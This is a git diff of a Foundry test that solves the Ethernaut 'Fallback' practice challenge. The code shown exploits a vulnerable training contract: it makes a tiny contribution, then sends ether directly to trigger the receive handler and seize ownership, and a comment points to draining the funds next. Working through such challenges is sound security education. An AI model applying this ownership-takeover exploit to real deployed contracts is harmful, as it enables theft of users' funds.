@@ -36,8 +36,12 @@ contract TestFallback is BaseTest {
 
     function exploitLevel() internal override {
         vm.startPrank(player);
+        // Challenge explained here:
+        // https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008
 
         /** CODE YOUR EXPLOIT HERE */
+        // run test with: `forge test  --match-contract Fallback -vv`
+
         // send the minimum amount to become a contributor
         emit log_named_address("Owner", level.owner());
         emit log_named_uint("Owner balance", address(level).balance);
@@ -46,11 +50,14 @@ contract TestFallback is BaseTest {
         level.contribute{value: 1 wei}();
 
         emit log_named_uint("Contributions", level.getContribution());
-        emit log_named_address("Owner", level.owner());
+        emit log_named_address("Still same owner", level.owner());
 
         // this calls default receive handler in the contract
         // see more here: https://solidity-by-example.org/sending-ether/
-        address(level).call{value: 1 wei}("");
+        // an alternative here - if not sending ether via the .call - would be to loop
+        // the level.contribut call until reaching the higher level than the current owner
+        (bool success, ) = address(level).call{value: 1 wei}("");
+        require(success, "Sending via call failed");
         emit log_named_address("New owner", level.owner());
 
         // now let's empty that contract :-) as we are the new owner
